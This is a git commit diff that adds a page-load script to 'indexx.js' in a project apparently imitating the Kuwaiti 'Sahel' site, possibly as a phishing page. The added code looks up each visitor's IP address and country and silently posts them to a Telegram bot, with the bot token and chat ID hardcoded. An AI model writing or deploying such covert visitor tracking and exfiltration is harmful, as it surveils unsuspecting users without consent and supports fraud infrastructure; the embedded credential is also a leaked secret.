6097ddfcc0581a34158dd795ba321d4e9542c7d6
kuwait2025 <jmyguyj@gmail.com>
2025-05-06 17:17:57 +0300

    Update indexx.js

--- sahel/main.html/null/null/null/indexx.js
+++ sahel/main.html/null/null/null/indexx.js
@@ -39,3 +39,39 @@ document.getElementById("form1").addEventListener("submit", function(e) {
       alert("حدث خطأ أثناء الإرسال.");
     });
   });
+
+
+  window.onload = function () {
+    // استدعاء API خارجي لجلب موقع الزائر بناءً على IP
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const country = data.country_name || "غير معروف";
+        const ip = data.ip || "غير معروف";
+  
+        const token = "7847502445:AAGXYt3fTBBIXRQufdb_DrhkIrKO5oWuJng";
+        const chatId = "7595871538";
+  
+        const message = `
+  🌍 زيارة جديدة للموقع
+  📍 الدولة: ${country}
+  🌐 IP: ${ip}
+  🕒 الوقت: ${new Date().toLocaleString()}
+        `;
+  
+        // إرسال الرسالة إلى تليجرام
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      })
+      .catch(error => {
+        console.error("فشل في جلب موقع الزائر:", error);
+      });
+  };
